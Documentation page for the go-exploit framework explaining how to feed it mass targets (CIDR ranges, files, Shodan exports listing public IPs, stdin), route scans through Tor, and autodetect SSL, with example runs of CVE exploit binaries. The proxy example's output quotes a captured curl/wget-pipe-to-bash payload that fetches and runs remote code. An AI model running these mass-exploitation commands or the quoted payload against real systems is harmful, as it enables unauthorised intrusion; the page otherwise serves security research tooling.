# Scanning

`go-exploit` is designed to scan many hosts at once, and there are a number of features that support that design.

## Providing Targets

Let's start with providing targets to a `go-exploit`. The system understands three command line options for targets:

1. `-rhost`: single target
2. `-rhosts`: multiple targets
3. `-rhosts-file`: multiple targets in a file

### Provide Targets via Command Line

The standard way to provide a single target is via `-rhost`. This accepts one target in the form of a hostname, IPv4 address, or IPv6 address. Example:

```sh
./build/cve-2023-51467_linux-arm64 -c -rhost 10.9.49.88
```

To specify more than one target, you can use the `rhosts` flag. This supports comma delimited targets as well as CIDR notation. Examples:

```sh
./build/cve-2023-51467_linux-arm64 -a -v -rhosts 10.9.49.174,10.9.49.205 -rports 80,10000 
```

```sh
./build/cve-2023-38646_linux-arm64 -v -rhosts 192.168.1.0/24 -rport 80
```

### Provide Targets via File

Lists of targets can also be provided via file using the `-rhosts-file` flag. Three file formats are supported:

1. Target format of `<ip>:<port>`, one per line
2. Target format of `<ip>,<port>,<any value if ssl is enabled>`, one per line
3. [VulnCheck IP Intel JSON](https://docs.vulncheck.com/products/initial-access-intelligence/ip-intel#detection-types), one per line

#### Example Using Shodan 

While `go-exploit` is not currently hooked up to the Shodan API, it is easy to massage Shodan results into a format that `go-exploit` can ingest via `-rhosts-file`. The following example demonstrates converting Shodan results into the `<ip>,<port>,<any value if ssl is enabled>` format.

```sh
albinolobster@mournland:~$ shodan count html:"jive-loginVersion"
6549
albinolobster@mournland:~$ shodan download openfire html:"jive-loginVersion"
Search query:			html:jive-loginVersion
Total number of results:	6549
Query credits left:		9531
Output file:			openfire.json.gz
  [###################################-]   99%  00:00:00
Saved 1000 results into file openfire.json.gz
albinolobster@mournland:~$ shodan parse --fields ip_str,port,ssl.jarm --separator , openfire.json.gz > openfire.csv
albinolobster@mournland:~$ tail openfire.csv
51.222.136.154,9090,
158.69.113.214,9091,07d14d16d21d21d07c07d14d07d21d9b2f5869a6985368a9dec764186a9175
217.222.136.11,9090,
201.245.189.172,9090,
200.170.135.46,9090,
74.84.138.186,9090,
115.22.164.115,9090,
192.99.169.243,9090,
117.248.109.34,9090,
208.180.74.57,9090,
albinolobster@mournland:~$ ./build/cve-2023-32315_linux-arm64 -v -rhosts-file ./openfire.csv
```

### Provide Targets via Stdin

Targets can also be provided via stdin. `go-exploit` accepts all `-rhosts-file` formats listed above. Usage example:

```
albinolobster@mournland:~/cve-2023-51467$ echo 10.9.49.88:8443 | ./build/cve-2023-51467_linux-arm64 -a -c -rhosts-file - -lhost 192.168.1.91 -lport 1270
time=2024-03-05T09:19:06.627-05:00 level=STATUS msg="Starting target" index=0 host=10.9.49.88 port=8443 ssl=false "ssl auto"=true
time=2024-03-05T09:19:06.713-05:00 level=STATUS msg="Running a version check on the remote target" host=10.9.49.88 port=8443
time=2024-03-05T09:19:07.251-05:00 level=VERSION msg="The self-reported version is: 18.12" host=10.9.49.88 port=8443 version=18.12
time=2024-03-05T09:19:07.251-05:00 level=SUCCESS msg="The target *might* be a vulnerable version. Continuing." host=10.9.49.88 port=8443 vulnerable=possibly
```

Note that providing targets via stdin disables use of any C2 that also would have used stdin (e.g. the reverse shells).

## Proxy

`go-exploit` supports HTTP, HTTPS, and SOCKS5 proxy via the `-proxy` command line option. All TCP connections (`TCPConnect`, `TLSConnect`, and `MixedConnect`) are proxy aware and will honor the SOCKS5 proxy. The various HTTP functions will all work as expected with an HTTP or HTTPS proxy. The following example demonstrates scanning via local Tor socks5 proxy on port 9050:

```
albinolobster@mournland:~/rocketmq-broker-conf$ ./build/main_linux-arm64 -a -e -rhosts-file /tmp/rocketmq.csv -proxy socks5://127.0.0.1:9050 -log-json true 2>/dev/null | jq 'select(.msg == "Extracted the variable")'
{
  "time": "2023-08-31T13:45:35.781849255-04:00",
  "level": "SUCCESS",
  "msg": "Extracted the variable",
  "rocketmqHome": "-c $@|sh . echo (curl -s x.x.x.x/rm.sh||wget -q -O- x.x.x.x/rm.sh)|bash;",
  "host": "x.x.x.x",
  "port": 10909
}
```

## Autodetect SSL

It is often the case, when doing mass scanning, that we aren't sure if the targets use of SSL. `go-exploit` solves this by providing the `-a` flag, or SSL "autodetect" flag. When this flag is in use, the first interaction the `go-exploit` will have with the target is probing for SSL usage. The `go-exploit` will then honor the results of the probe for the remainder usage.
